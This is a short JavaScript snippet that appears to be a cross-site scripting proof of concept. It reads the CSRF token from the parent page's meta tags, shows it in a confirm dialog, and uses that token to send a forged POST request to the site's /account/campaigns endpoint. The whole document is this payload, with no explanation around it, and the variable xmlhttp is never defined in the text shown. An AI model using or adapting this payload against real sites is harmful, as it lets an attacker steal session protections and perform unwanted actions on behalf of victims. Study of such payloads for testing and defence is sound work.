
var meta = parent.document.getElementsByTagName('meta');
for (i=0; i<meta.length; i++) {
  if (meta[i].getAttribute("name") == "csrf-token") {
    var csrfToken = meta[i].getAttribute("content");
    confirm("Users CSRF token: "+csrfToken);

    xmlhttp.open("POST","/account/campaigns",true);
    xmlhttp.setRequestHeader("X-CSRF-Token",csrfToken);
    xmlhttp.send("csrf="+csrfToken);
  }
}
